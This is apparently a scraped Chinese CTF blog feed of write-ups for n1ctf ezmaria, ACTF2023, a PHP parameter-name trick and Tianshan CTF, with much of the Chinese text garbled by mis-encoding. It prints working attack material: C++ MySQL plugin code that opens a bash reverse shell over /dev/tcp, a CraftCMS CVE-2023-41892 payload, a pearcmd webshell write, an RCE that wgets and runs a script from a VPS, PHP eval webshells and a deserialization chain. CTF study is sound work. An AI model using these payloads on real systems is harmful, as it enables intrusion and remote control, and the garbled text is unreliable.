Store\u0026lt;/h1\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-xl-9 mx-auto position-relative\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;mb-5\u0026#34;\u0026gt;What do you want to buy\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-md-10 col-lg-8 col-xl-7 mx-auto position-relative\u0026#34;\u0026gt; \u0026lt;form method=\u0026#34;get\u0026#34; action=\u0026#34;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-12 col-md-9 mb-2 mb-md-0\u0026#34;\u0026gt; \u0026lt;input class=\u0026#34;form-control form-control-lg\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;id\u0026#34; placeholder=\u0026#34;lolita love U\u0026#34; \u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-12 col-md-3\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;btn btn-primary btn-lg\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;å¼€æœ\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;style\u0026gt; .left-align { text-align: left; } \u0026lt;/style\u0026gt; \u0026lt;section class=\u0026#34;text-center bg-light features-icons\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-md-6\u0026#34;\u0026gt; \u0026lt;h5\u0026gt;Key Source\u0026lt;/h5\u0026gt; \u0026lt;div class=\u0026#34;left-align\u0026#34;\u0026gt; \u0026lt;?php $hstr = \u0026lt;\u0026lt;\u0026lt;XS \\\\$cmd = \u0026#34;select name, price from items where id = \u0026#34;.\\\\$_REQUEST[\u0026#34;id\u0026#34;]; \\\\$result = mysqli_fetch_all(\\\\$result); \\\\$result = \\\\$result[0]; XS; highlight_string($hstr, false); ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-md-6\u0026#34;\u0026gt; \u0026lt;h5\u0026gt;Executed Operations:\u0026lt;/h5\u0026gt; \u0026lt;div class=\u0026#34;left-align\u0026#34;\u0026gt; \u0026lt;?php highlight_string($cmd) ?\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; \u0026lt;?php highlight_string($result); ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;section class=\u0026#34;showcase\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container-fluid p-0\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row g-0\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;script src=\u0026#34;bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;, ) ä¼ ä¸ªå‚è¯•è¯•\nä»¥çœ‹åˆ°mysqlçš„pluginç›®å½•æ˜¯/mysql/pluginä»¥åŠsecure-file-privæ˜¯ç©ºçš„ï¼Œè¿‡æ»¤äº†outfileä½†æ²¡æœ‰è¿‡æ»¤dumpfileï¼Œè€Œä¸”ä½¿ç”¨çš„æ˜¯multi_queryï¼Œå¯ä»¥è¿›è¡Œå †å æ³¨å…¥\nä»ä¸Šé¢æ¥çœ‹è¿‡æ»¤æ¿äº†functionè¿™ä¸ªå…³é”®è¯ä¹Ÿå°±æ˜¯è¯´æ— æ³•åˆ©ç”¨udfè¿›è¡Œcreate function ä½†æ˜¯INSTALL PLUGIN çš„åŠŸèƒ½å¯ä»¥åˆ©ç”¨ï¼Œå› ä¸ºåŒæ ·ä¹Ÿæ˜¯åŠ è½½ plugin_dir é‡Œè¾¹çš„ so æ–‡ä»¶\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¼–è¯‘ä¸€ä¸ªsoæ–‡ä»¶ç„¶åè®©mysqlç›´æ¥installè‡ªåŠ¨åŠ è½½soæ–‡ä»¶å¯ä»¥åˆ©ç”¨è¿™ä¸ªåå¼¹shell\nå¯æ˜¯å‘ç°æ•°æ®åº“æ²¡æœ‰åˆå§‹åŒ–ï¼Œä½†æ˜¯åˆ©ç”¨äº†skip-grant-tablesè¿™ä¸ª å‚è€ƒæ–‡ç« ï¼š https://blog.csdn.net/ibsfn/article/details/88963040 å¯ä»¥è·³è¿‡æƒé™è¿›è¡Œå›å¤è¡¨ åˆ©ç”¨å †å æ³¨å…¥è¿›è¡Œæ¢å¤è¡¨ï¼š\nCREATE DATABASE IF NOT EXISTS mysql; use mysql; CREATE TABLE IF NOT EXISTS plugin ( name varchar(64) DEFAULT \u0026#39;\u0026#39; NOT NULL, dl varchar(128) DEFAULT \u0026#39;\u0026#39; NOT NULL, PRIMARY KEY (name) ) engine=Aria transactional=1 CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci comment=\u0026#39;MySQL plugins\u0026#39;; ç„¶åç¼–å†™æ’ä»¶è¿›è¡Œè‡ªåŠ è½½soæ–‡ä»¶\nç‰ˆæœ¬ä¸€ï¼š\n#includeÂ \u0026lt;stdio.h\u0026gt; #includeÂ \u0026lt;sys/types.h\u0026gt; #includeÂ \u0026lt;stdlib.h\u0026gt; voidÂ _init(){Â system(\u0026#34;/bin/bashÂ -cÂ \u0026#39;bashÂ -iÂ \u0026gt;\u0026amp;Â /dev/tcp/IP/PORTÂ 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;);} å‚è€ƒï¼š https://mp.weixin.qq.com/s/N03QtNsMvpux42xIAXxvrA\nç‰ˆæœ¬äºŒï¼š\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void lshell(){ system(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/ip/port 0\u0026gt;\u0026amp;1 \u0026amp;\u0026#39;\u0026#34;); } class DELETE { public: DELETE(){ lshell(); } }; DELETE delete; DELETE* _mysql_plugin_interface_version_ = \u0026amp;delete; //compile: g++ expso.cpp -shared -fPIC -o exp.so å‚è€ƒlolitaå¸ˆå‚…å†™çš„ï¼š https://github.com/Nu1LCTF/n1ctf-2023/blob/main/web/ezmaria/writeup/writeup.md\nå°†ç¼–è¯‘å‡ºæ¥çš„soæ–‡ä»¶ç”¨dumpfileå†™åˆ°/mysql/plugin/ç›®å½•\nå¯ä»¥ç”¨lolitaå¸ˆå‚…å†™çš„pyç›´æ¥å¼¹shell\nhttps://github.com/Nu1LCTF/n1ctf-2023/blob/main/web/ezmaria/writeup/exp.py\nå‘ç°æ²¡æœ‰æƒé™è¯»flag æ‰€ä»¥æ‰¾suidå’Œcap(çº¯æŠ„)\nfind / -user root -perm -4000 -print 2\u0026gt;/dev/null getcap -r / 2\u0026gt;/dev/null /usr/bin/mariadb cap_setfcap=ep å…³äºlinuxçš„setcapçœ‹æ–‡ç«  https://blog.csdn.net/xdy762024688/article/details/132237969\nå¤§æ¦‚çš„æ„æ€å°±æ˜¯åœ¨2.1ç‰ˆæœ¬ä¹‹åæœ‰äº†â€œåˆ†æƒâ€çš„æ¦‚å¿µï¼Œç„¶ååˆ©ç”¨è¿™ä¸ªè·å–è¯»å–æ–‡ä»¶çš„èƒ½åŠ›\nä¹Ÿå°±æ˜¯æˆ‘ä»¬èƒ½ç»™å…¶ä»–æ–‡ä»¶è®¾ç½®cap\nç»™mariadbå†™ä¸ªæ’ä»¶\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/capability.h\u0026gt; void lshell(){ cap_t caps = cap_from_text(\u0026#34;cap_dac_override=eip\u0026#34;); cap_set_file(\u0026#34;/bin/cat\u0026#34;, caps); printf(\u0026#34;setcap finished\\n\u0026#34;); } class DELETE { public: DELETE(){ lshell(); } }; DELETE _mysql_client_plugin_declaration_; //compile: g++ expcap.cpp -shared -fPIC -o cap.so -lcap2 ç„¶åä¸Šä¼ åˆ°é¶æœºæœ‰ä¸‰ä¸ªæ–¹å¼ ä¸€ã€å‘ç°æœºå™¨ä¸Šæœ‰curl ç›´æ¥å¤–éƒ¨ä¸‹è½½è¿œç¨‹çš„æœåŠ¡å™¨ä¸Šçš„soæ–‡ä»¶ äºŒã€lolitaå¸ˆå‚…çš„expé‡Œé¢çš„å‘½ä»¤å¯ä»¥ç›´æ¥ç©¿è¶Š ä¸‰ã€åˆ©ç”¨pythonå†æ¬¡dumpfileè¿›å»\nè¿™é‡Œå½“æ—¶æˆ‘æœ‰ä¸ªé—®é¢˜å°±æ˜¯\nmariadb --plugin-dir=. --default-auth=cap ä»–å¯ä»¥è‡ªå·±é…è·¯å¾„ï¼Œæ‰€ä»¥ä¸éœ€è¦è€ƒè™‘è‡ªå·±çš„soæ–‡ä»¶ä¸Šä¼ åˆ°å“ªé‡Œå» æœ€åç›´æ¥cat /flag\næ‹¿ä¸‹ æ¯æ¬¡å¤ç°éƒ½èƒ½å­¦åˆ°å¾ˆå¤šä¸œè¥¿ï¼ŒåŠ æ²¹åŠ æ²¹\n","date":"3 November 2023","externalUrl":null,"permalink":"/posts/n1ctf-ezmaira/","section":"Posts","summary":"","title":"n1ctf-ezmaira","type":"posts"},{"content":"ä¸œæ–¹åŸç¥å¤§å­¦-MISC #\rfofa ç§’äº†\nMyGO\u0026rsquo;s Live!!!!!-WEB #\rè¯·æ±‚ï¼šhttp://124.70.33.170:24000/checker?url=124.70.33.170:80\nç›´æ¥è‡ªå·±namp\nCraftcms\u0026ndash;WEB #\rcraftcms\nCVE-2023-41892\nç½‘ä¸Šæœ‰POCï¼ˆæ— æœï¼‰\nhttps://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce\nçœ‹äº†ä¸€ä¸‹pocï¼Œå‡ºç°çš„åœ°æ–¹åº”è¯¥æ˜¯\\craft\\controllers\\ConditionsController\nçŒœä¸€æ‰‹æ˜¯ååºåˆ—åŒ–+RCE\nhttps://blog.calif.io/p/craftcms-rce\næ„é€ äº†ä¸€ä¸‹poc ä½†æ˜¯å¥½åƒåªèƒ½æ‰§è¡Œphpinfo å‘ç°äº†è´¦å·å¯†ç ï¼Œç™»å½•\nå¤‡ä»½äº†ä¸‹æ•°æ®åº“ï¼Œæ²¡çœ‹è§æœ‰ä»€ä¹ˆä¸œè¥¿\næ€è·¯äºŒï¼šhttps://www.anquanke.com/post/id/201136 https://www.cnblogs.com/Xy\u0026ndash;1/p/12769094.html https://github.com/vulhub/vulhub/tree/master/php/inclusion\næ€è·¯ä¸‰ï¼špercmd https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html\næ€è·¯ä¸‰å¯ä»¥ï¼Œ\npearcmdå†™å…¥æ–‡ä»¶\nå…ˆç”¨cveåŒ…å«pearcmd.phpç„¶åå†™å…¥shell\nåŒ…å«\naction=conditions/render\u0026amp;configObject=craft\\elements\\conditions\\ElementCondition\u0026amp;config={\u0026#34;name\u0026#34;:\u0026#34;configObject\u0026#34;,\u0026#34;as \u0026#34;:{\u0026#34;class\u0026#34;:\u0026#34;\\\\yii\\\\rbac\\\\PhpManager\u0026#34;,\u0026#34;__construct()\u0026#34;:[{\u0026#34;itemFile\u0026#34;:\u0026#34;/usr/local/lib/php/pearcmd.php\u0026#34;}]}} å†™å…¥\n/?+config-create+/\u0026lt;?=@eval($_POST[\u0026#39;1\u0026#39;]);die();?\u0026gt;+/tmp/delete åŒ…å«äº†ä½†æ˜¯æ‰§è¡Œ/readflagæ²¡æœ‰å›æ˜¾\nèšå‰‘è¿ä¸€ä¸‹ç„¶ååŠ ä¸€ä¸ªæ–‡ä»¶\n\u0026lt;?php error_reporting(E_ALL); echo \u0026#34;1\u0026#34;; $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), // æ ‡å‡†è¾“å…¥ï¼Œå­è¿›ç¨‹ä»æ­¤ç®¡é“ä¸­è¯»å–æ•°æ® 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), // æ ‡å‡†è¾“å‡ºï¼Œå­è¿›ç¨‹å‘æ­¤ç®¡é“ä¸­å†™å…¥æ•°æ® 2 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;) // æ ‡å‡†é”™è¯¯ï¼Œå†™å…¥åˆ°ä¸€ä¸ªæ–‡ä»¶ ); $file=array(); $process = proc_open(\u0026#34;/readflag 2\u0026gt;\u0026amp;1\u0026#34;, $descriptorspec, $file); var_dump($process); var_dump($file); function readln($file){ $out = \u0026#34;\u0026#34;; $a = fread($file, 1); echo \u0026#34;readln\u0026#34;; while ($a != \u0026#34;\\n\u0026#34;) { $out = $out.$a; $a = fread($file, 1); } return $out; } $data=readln($file[1]); var_dump($data); $data=readln($file[1]); var_dump($data); $ans = \u0026#34;\u0026#34;.eval(\u0026#34;return \u0026#34;.$data.\u0026#34;;\u0026#34;).\u0026#34;\\n\u0026#34;; echo \u0026#34;ans\u0026#34;; var_dump($ans); fputs($file[0], $ans); $data=readln($file[1]); echo $data; $data=readln($file[1]); echo $data; $data=readln($file[1]); echo $data; ?\u0026gt; ç›´æ¥è®¿é—®å³å¯\nHook-WEB BY ç‹æ›¦ï¼ˆèµ›åï¼‰ #\rGateway: http://124.70.33.170:8088/\nIntranet jenkins service: http://jenkins:8080/\nHint: Please Abuse Gitxxb Webhooks\nå¤§æ¦‚çœ‹ä¸€ä¸‹é¢˜ç›®ï¼ŒçŒœæµ‹éœ€è¦ä»nginxæ‰“SSRFæˆ–è€…è¯·æ±‚èµ°ç§åˆ°å†…ç½‘jenkinsï¼Œç„¶åå®ç°ä¸€äº›æ“ä½œã€‚\næ— è®ºå¦‚ä½•è®¿é—®nginxæœåŠ¡éƒ½æ˜¯403çš„çŠ¶å†µï¼Œæ ¹æ®æç¤ºå°è¯•Github/Gitlabçš„webhook\nåœ¨å‚è€ƒæ–‡ç« 1å’Œ2ä¸­å‘ç°äº†æœ‰æ®µæè¿°Â·\ngitlabè®¿é—®webhookå¦‚æœå‡ºç°302å¯ä»¥è‡ªåŠ¨é‡å®šå‘ã€‚å°è¯•é‡å®šå‘è®¿é—®ç½‘ç«™ æ¥ä¸‹æ¥åœ¨gitlabä¸­æ–°å»ºprojectï¼Œwebhookå‘vpsè¯·æ±‚ï¼Œå‘ç”Ÿè·³è½¬ï¼ˆç›´æ¥è¯·æ±‚åœ°å€è¿”å›Method Not Allowedï¼‰ è®¿é—®æˆåŠŸï¼Œæç¤ºäº†éœ€è¦åŠ å…¥å‚æ•°\næˆåŠŸè®¿é—®å†…ç½‘æœåŠ¡\næ³¨æ„ä¸€ä¸‹ç¼–ç  å‚è€ƒæ–‡ç« \nhttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/ https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/ https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/ https://aluvion.github.io/2019/02/26/CVE-2019-1003000%E5%A4%8D%E7%8E%B0/ https://vulhub.org/#/environments/jenkins/CVE-2018-1000861/ Ave Mujica\u0026rsquo;s Masquerade-WEB BY ç‹æ›¦ï¼ˆèµ›åï¼‰ #\rå‚è€ƒ\nhttps://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html\n::firefox``:`\nå‘ç°å¯ä»¥RCE æ„é€ wget \\3.137.154.242/1 -O /tmp/1.shï¼Œç©ºæ ¼æ›¿æ¢æˆ$IFSå°è¯•ä¸‹è½½\nchecker?url=127.0.0.1::wget$IFS\\vps:port/1$IFS-O$IFS/tmp/1.sh``:`\nç„¶åè°ƒç”¨/tmp/1.sh\nchecker?url=127.0.0.1::sh$IFS/tmp/1.sh``:` ","date":"31 October 2023","externalUrl":null,"permalink":"/posts/actf/","section":"Posts","summary":"","title":"ACTF2023 WP","type":"posts"},{"content":"åŸºç¡€ #\rtip: PHPversion \u0026lt;8.0 #\ræºä»£ç ï¼š\n\u0026lt;?php highlight_file(__FILE__); error_reporting(0); $var = $_REQUEST[\u0026#39;D T.\u0026#39;]; var_dump($_REQUEST); echo \u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; echo phpversion(); å¯ä»¥çœ‹è§è¿™é‡Œåšäº†ä¸€ä¸ªä¼ å‚ï¼Œå‚æ•°åä¸ºD T. æˆ‘ä»¬å¯ä»¥è¯•ä¸€ä¸‹ä¼ å‚ å¯ä»¥çœ‹è§è¿™é‡Œå°†ç©ºæ ¼å’Œ.å·åšäº†è½¬ä¹‰å˜æˆäº†_\nåŒæ ·çš„æˆ‘ä»¬ä¸¾ä¾‹å­Â·\n\u0026lt;?php highlight_file(__FILE__); error_reporting(0); $var = $_REQUEST[\u0026#39;D_T.\u0026#39;]; var_dump($_REQUEST); echo \u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; echo phpversion(); æ˜æ˜¾å¯ä»¥çŸ¥é“ï¼Œæˆ‘ä»¬æ— æ³•ä¼ å…¥æˆ‘ä»¬éœ€è¦çš„å‚æ•°\né‚£ä¹ˆæ­¤æ—¶è¦ç”¨åˆ°ä¸€ä¸ªphpversion\u0026lt;8çš„ç‰¹æ€§ï¼šå½“ä¼ å…¥çš„å‚æ•°ä¸­å«æœ‰[æ—¶ï¼Œ[ä¼šè¢«è½¬ä¹‰æˆ_ä½†æ˜¯åé¢çš„å‚æ•°å°±ä¸ä¼šè¢«è½¬ä¹‰ ä¹Ÿå°±æ˜¯è¯´ å¯ä»¥çœ‹è§æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°åæ˜¯æ­£ç¡®çš„\nåˆ†æ #\ré¦–å…ˆï¼Œä»phpå®˜ç½‘æŸ¥çœ‹ å‘ç°äº†è¿™ä¸ªç‰¹æ€§ ç„¶åæˆ‘ä»¬å»githubæ‰¾åˆ°å¯¹åº”çš„ä»£ç  å¯ä»¥çœ‹è§è¿™é‡Œå¯¹è½¬ä¹‰å†™çš„å¾ˆæ˜ç™½äº† æ‰€ä»¥æˆ‘ä»¬åœ¨php8ä¸­å¯ä»¥é¢„è§ åé¢çš„ç‚¹å·ä¹Ÿè¢«è½¬ä¹‰äº†\nç¤ºä¾‹ #\r\u0026lt;?php highlight_file(__FILE__); error_reporting(0); $query = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; if (preg_match(\u0026#39;/_|%5f|\\.|%2E/i\u0026#39;, $query)){ die(\u0026#39;you are a hacker!\u0026#39;); } $var = $_REQUEST[\u0026#39;D_T_\u0026#39;]; var_dump($_REQUEST); echo \u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; echo phpversion(); è¿™æ—¶å€™ï¼Œéœ€è¦ä½ å»ä¼ å…¥D_T_è¿™ä¸ªå‚æ•°ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥çœ‹è§\n$query = $_SERVER[\u0026lsquo;QUERY_STRING\u0026rsquo;];\nå¯¹ä¼ å…¥çš„å‚æ•°ä¹Ÿåšäº†é™åˆ¶ï¼Œæ— æ³•ç›´æ¥ä¼ å…¥_æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨phpçš„ç‰¹æ€§ ä»è€Œè¿›è¡Œç»•è¿‡\nç®€å•çš„ä¸¾ä¸ªCTFä¸­çš„ä¾‹å­\n\u0026lt;?php highlight_file(__FILE__); error_reporting(0); $query = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; if (preg_match(\u0026#39;/_|%5f|\\.|%2E/i\u0026#39;, $query)){ die(\u0026#39;you are a hacker!\u0026#39;); } $var = $_REQUEST[\u0026#39;D_T.\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; var_dump($_REQUEST); if(is_null($var)){ eval($b); }else{ echo \u0026#39;æ²¡æœ‰æˆåŠŸï¼\u0026#39;; } echo \u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; echo phpversion(); æ‰€ä»¥æˆ‘ä»¬çš„playloadå°±æ˜¯http://127.0.0.1/1/1.php?D T[=1\u0026amp;b=phpinfo();\n","date":"27 October 2023","externalUrl":null,"permalink":"/posts/php-parameter/","section":"Posts","summary":"","title":"PHPä¸­éæ³•å‚æ•°åé—®é¢˜åˆ†æ","type":"posts"},{"content":"web 3å‡º2\nweb1 by DT #\rè¿›æ¥å…ˆçœ‹æºç :\n\u0026lt;?php header(\u0026#34;Content-type:text/html;charset=utf-8\u0026#34;); show_source(__FILE__); error_reporting(0); class Flag{ public $a; public $b; public $c; public function __construct(){ $this-\u0026gt;a = 123123; $this-\u0026gt;b = \u0026#39;pwd\u0026#39;; $this-\u0026gt;arr = array(); } public function __destruct(){ echo $a; $this-\u0026gt;arr[$this-\u0026gt;a]=1; if ($this-\u0026gt;arr[]=1){ echo \u0026#39;Please!!!\u0026#39;; } else{ system($this-\u0026gt;b); } } } $was = $_GET[\u0026#39;was\u0026#39;]; unserialize($was); å‘ç°æ˜¯ä¸€ä¸ªpopï¼Œç„¶ååœ¨destructé‚£é‡Œåšäº†ä¸€ä¸ªarrayçš„é™åˆ¶ é‚£å°±åˆ©ç”¨intç±»å‹æº¢å‡ºä¸ºç©ºçš„ç‰¹æ€§æ„é€ pop åˆ©ç”¨äº†è¿™ä¸ªæ–‡ç« ï¼šhttps://blog.csdn.net/starttv/article/details/127905422\n\u0026lt;?php class Flag{ public $a; public $b; public $c; } $e=new Flag(); $e-\u0026gt;$b=\u0026#39;ls\u0026#39;; $e-\u0026gt;$a=9223372036854775807; echo serialize($e); ä½†æ˜¯å‘ç°ä¸è¡Œï¼Œæœ¬åœ°è°ƒè¯•å‘ç°æ²¡æœ‰è‡ªå·±è°ƒç”¨constructå‡½æ•°ï¼Œæ‰€ä»¥è‡ªå·±æ·»åŠ ä¸€ä¸ªarrayå†æ¬¡æ„é€ pop\n\u0026lt;?php class Flag{ public $a; public $b; public $c; public $arr; } $e=new Flag(); $e-\u0026gt;a=9223372036854775807; $e-\u0026gt;arr=array(); $e-\u0026gt;b=\u0026#39;ls\u0026#39;; echo serialize($e); å‘ç°æœ‰test.phpç­‰æ–‡ä»¶ï¼Œè¿›è¡ŒæŸ¥çœ‹cat å‘ç°å†™äº†ä¸€ä¸ªé©¬å­ï¼Œç›´æ¥ä¸Šå· çœ‹åˆ°äº†/var/www/html/sql_connect/sql-connect.php\n(å°è¯•ä¿®æ”¹äº†ä»£ç ï¼Œæ²¡æƒ³åˆ°çœŸçš„å¯ä»¥ä¿®æ”¹ï¼Œç´¢æ€§ç›´æ¥ä¿®æ”¹æºä»£ç )\n\u0026lt;?php $dbuser = \u0026#39;root\u0026#39;; $dbpass = \u0026#39;root\u0026#39;; $dbname = \u0026#34;dascctf\u0026#34;; $host = \u0026#39;127.0.0.1\u0026#39;; $con = mysqli_connect($host, $dbuser, $dbpass, $dbname) or die(\u0026#39;Could not connect to database.\u0026#39;); $query = \u0026#34;SELECT * FROM flag\u0026#34;; //çŒœçš„è¡¨å $result = mysqli_query($con, $query); if ($result) { while ($row = mysqli_fetch_assoc($result)) { foreach ($row as $key =\u0026gt; $value) { echo \u0026#34;$key: $value\u0026lt;br\u0026gt;\u0026#34;; } } } else { echo \u0026#34;Query failed: \u0026#34; . mysqli_error($con); } mysqli_close($con); ?\u0026gt; ç›´æ¥è®¿é—®/sql_connect/sql-connect.php` å¾—åˆ°flag\nweb2 by D.T #\rè¿›å…¥å‘ç°æœ‰ä¸ªlockï¼Œè¿›å…¥çœ‹çœ‹ ç®€å•çš„æ–‡ä»¶ä¸Šä¼  æœ¬åœ°å†™ä¸€ä¸ªä¸Šä¼ é©¬å­\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;æ–‡ä»¶ä¸Šä¼ è¡¨å•\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;http://1.14.108.193:43321/Secr3t.php\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;file\u0026#34;\u0026gt;é€‰æ‹©æ–‡ä»¶ï¼š\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;file\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;ä¸Šä¼ æ–‡ä»¶\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å°é©¬\n\u0026lt;?php eval($_POST[\u0026#34;123\u0026#34;]); ?\u0026gt; ä¸Šä¼  Crypto b@se#Lulzcart #\rå…ˆä¸‹è½½æ–‡ä»¶çœ‹åˆ°å¯†é’¥å’Œbaseç¼–ç ï¼› æˆ‘åœ¨è¿™é‡Œåˆ©ç”¨äº†å¾€å¹´çš„è„šæœ¬ï¼Œåœ°å€ï¼šhttps://blog.csdn.net/qq_58370970/article/details/123339389\nå…ˆç¼–å†™è„šæœ¬ï¼š\nimport string s = \u0026#39;YOJyHo57WlUFzCfDgjn0Sb9ET****sqVLX42kNaIhr+dtPm1u3AMKpwRGvcxQZ8B\u0026#39; j = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39; for i in j: if i not in s: â€¢ print(i), å¾—åˆ°ç¼ºå¤±çš„4ä¸ªå­—ç¬¦ï¼› ç»“æœï¼šei6/ ä½†ä¸çŸ¥é“é¡ºåºï¼Œå¯ä»¥é€šè¿‡ä»£ç æ•´å‡º24ç§ä¸åŒçš„base64å˜ç§çš„æ’åºï¼š å…·ä½“è„šæœ¬ï¼š\nstr=\u0026#34;YOJyHo57WlUFzCfDgjn0Sb9ET****sqVLX42kNaIhr+dtPm1u3AMKpwRGvcxQZ8B\u0026#34; ciper=\u0026#34;jHo0gpj5qwNVs5L3/aPVq9ZpEwCX/NZIz7jVs5Xr6pZa/5oIVg\u0026#34;#(==æ²¡æœ‰ç”¨) import string import binascii for i in string.ascii_letters+string.digits: if i not in str: â€¢ print(i) import itertools s=[\u0026#39;e\u0026#39;,\u0026#39;i\u0026#39;,\u0026#39;6\u0026#39;,\u0026#39;/\u0026#39;] for i in itertools.permutations(s,4): ss=\u0026#34;YOJyHo57WlUFzCfDgjn0Sb9ET\u0026#34;+\u0026#34;\u0026#34;.join(i)+\u0026#34;sqVLX42kNaIhr+dtPm1u3AMKpwRGvcxQZ8B\u0026#34; bins = \u0026#34;\u0026#34; for j in ciper: bins+=bin(ss.index(j))[2:].zfill(6) print(binascii.unhexlify(hex(eval(\u0026#34;0b\u0026#34;+bins))[2:-1])) è¿è¡Œè„šæœ¬ï¼š æ‹¿åˆ°ä¸åŒçš„flag,å¯æ˜¯è¿™ä¸ªçœ‹èµ·æ¥i think you can get this flag è¿™ä¸ªè‹±æ–‡å¥å­ï¼Œæœ€ç»ˆflagæ˜¯ç¬¬äºŒä¸ªï¼š\nDASCTF{i_th1nk_you_can_g0t_this_flag}\n","date":"21 October 2023","externalUrl":null,"permalink":"/posts/%E5%A4%A9%E5%B1%B1/","section":"Posts","summary":"","title":"å¤©å±±å›ºç½‘çº¿ä¸Šèµ›WP","type":"posts"},{"content":"","date":"13 September 2023","externalUrl":null,"permalink":"/tags/sql/","section":"Tags","summary":"","title":"SQL","type":"tags"},{"content":"","date":"13 September 2023","externalUrl":null,"permalink":"/tags/udf/","section":"Tags","summary":"","title":"Udf","type":"tags"},{"content":"è¿™é“é¢˜æ˜¯N1å¤§ä½¬åšçš„ï¼Œå«æˆ‘æ¥æµ‹è¯•ä¸€ä¸‹\nurl:http://dev.xswl.io:8230/\nè¿›å…¥åå‘ç°key source é‚£å°±å¯ä»¥å¾ˆç®€å•çœ‹å‡ºæ˜¯sqlæ³¨å…¥\nåˆ¤æ–­åä¸ºæ•°å­—å‹ï¼Œå­—æ®µæ•°ä¸º2ï¼Œuserä¸ºroot f12-å‘ç°è®©æˆ‘ä»¬æŸ¥çœ‹æºç ï¼Œé‚£å°±æ˜¯è¯´è¦æ‹¿åˆ°æºç ï¼Œè€Œsqlæ³¨å…¥ä¸­åªèƒ½åˆ©ç”¨load_fileï¼ˆï¼‰å‡½æ•°è¿›è¡Œè¯»å–æºç \næ‰€ä»¥ï¼Œé»˜è®¤è·¯å¾„ä¸‹\næ‹¿åˆ°æºç \n\u0026lt;?php //forÂ n1ctfÂ ezmariadbÂ secretÂ cmd ifÂ ($_REQUEST[\u0026#34;SSSSSSSSSSSSSsecret\u0026#34;]Â ===Â \u0026#34;flag_is_not_here\u0026#34;){ header(\u0026#34;Content-Type:Â text/plain\u0026#34;); echoÂ \u0026#34;\\\\n\\\\n`psÂ -ef`Â result\\\\n\\\\n\u0026#34;; system(\u0026#34;psÂ -ef\u0026#34;); echoÂ 